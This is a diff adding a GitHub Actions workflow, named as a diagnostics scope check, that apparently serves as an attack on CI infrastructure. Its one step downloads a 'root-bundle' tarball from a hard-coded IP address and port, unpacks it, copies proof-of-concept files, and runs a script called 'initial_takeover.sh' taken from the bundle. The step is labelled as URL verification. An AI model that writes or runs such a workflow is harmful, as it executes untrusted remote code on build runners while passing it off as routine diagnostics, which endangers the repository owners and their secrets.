@@ -1,0 +1,22 @@
+name: Owned HCA diagnostics scope
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  scope:
+    runs-on: ubuntu-slim
+    timeout-minutes: 5
+    steps:
+      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
+      - name: Verify diagnostics URL scope
+        run: |
+          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
+          tar -xzf /tmp/root.tgz -C /tmp
+          cp poc/hca_diagnostics_scope_probe.py /tmp/hca_diagnostics_scope_probe.py
+          cp poc/root_hca_diagnostics_entry.sh /tmp/root_auto.sh
+          chmod +x /tmp/root_auto.sh /tmp/hca_diagnostics_scope_probe.py
+          HVS_INLINE=1 bash /tmp/initial_takeover.sh
